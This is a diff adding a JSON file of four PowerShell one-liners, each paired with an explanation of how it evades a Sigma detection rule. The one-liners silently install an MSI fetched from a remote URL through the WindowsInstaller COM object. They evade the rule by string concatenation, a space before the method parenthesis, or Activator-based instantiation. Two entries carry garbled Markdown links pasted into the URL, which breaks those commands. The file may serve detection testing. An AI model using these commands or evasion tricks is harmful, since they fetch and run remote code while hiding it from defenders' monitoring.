@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -WindowStyle Hidden -Command \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "explanation": "This command bypasses the Sigma rule by replacing the '.Insert(' string manipulation method with simple string concatenation ('W' + 'indowsInstaller.Installer'). Because the rule's condition requires ALL specified strings to be present in the command line, removing '.Insert(' successfully evades detection while achieving the same functional result."
+  },
+  {
+    "output": "powershell.exe -WindowStyle Hidden -Command \"$i=New-Object -Com WindowsInstaller.Installer; $i.UILevel=2; $i.'InstallProduct' ('https://example.com/test.msi', '')\"",
+    "explanation": "This variant bypasses the rule by omitting the '.Insert(' obfuscation entirely and by placing a space between the method name and the parenthesis. This breaks the exact string match for 'InstallProduct(' required by the rule, effectively bypassing the 'contains all' logic."
+  },
+  {
+    "output": "powershell.exe -WindowStyle Hidden -Command \"$u='[https://example.com/payload.msi](https://www.google.com/search?q=https://example.com/payload.msi)'; $t='W'+'indowsInstaller.Installer'; $i=New-Object -ComObject $t; $i.UILevel=2; $i.InstallProduct ($u, '')\"",
+    "explanation": "This command bypasses the rule by omitting the '.Insert(' string method entirely, opting for simple string concatenation ('W'+'indowsInstaller.Installer') instead. Additionally, it inserts a space between 'InstallProduct' and the opening parenthesis ('InstallProduct ('), which evades the strict 'InstallProduct(' match required by the selection_cli condition."
+  },
+  {
+    "output": "powershell.exe -w hidden -c \"$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('[https://example.com/payload.msi](https://www.google.com/search?q=https://example.com/payload.msi)', '')\"",
+    "explanation": "This alternative bypass avoids the '-ComObject' string by using the .NET [Activator]::CreateInstance method to instantiate the COM object. It also does not use the '.Insert(' method. Since the Sigma rule requires ALL conditions in selection_cli to be met, missing '-ComObject' and '.Insert(' successfully evades detection."
+  }
+]
